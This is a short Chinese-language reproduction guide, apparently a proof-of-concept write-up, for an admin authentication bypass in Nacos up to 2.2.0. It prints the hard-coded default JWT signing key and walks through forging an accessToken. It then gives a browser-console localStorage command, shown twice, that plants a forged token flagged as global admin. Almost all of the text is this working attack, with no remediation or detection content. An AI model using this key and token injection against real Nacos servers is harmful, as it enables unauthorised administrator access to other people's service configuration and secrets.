
## Nacos <= 2.2.0 任意管理员登录漏洞

### 前置条件
> 要配置了public(保留空间)的

### 漏洞原理：

鉴权体系默认使用的密钥为：SecretKey012345678901234567890123456789012345678901234567890123456789
任意攻击者可以使用这个伪造生成任意用户的accessToken用于进行后端接口访问。

### 漏洞复现

> 1、打开目标网站Nacos的登录页面

> 2、使用https://jwt.io/在线生成JWT token，使用上面的密钥，生成任意用户的accessToken.

> 3、替换accessToken，在F12 控制台执行下面的代码
```localStorage.setItem("token", "{\"accessToken\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyOTE2Nn0.2TogGhhr11_vLEjqKko1HJHUJEmsPuCxkur-CfNojDo\",\"tokenTtl\":18000,\"globalAdmin\":true}")```

> 4、然后访问Nacos的路径即可成功冒充任意用户以管理员权限登录
```
localStorage.setItem("token", "{\"accessToken\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyOTE2Nn0.2TogGhhr11_vLEjqKko1HJHUJEmsPuCxkur-CfNojDo\",\"tokenTtl\":18000,\"globalAdmin\":true}")
```
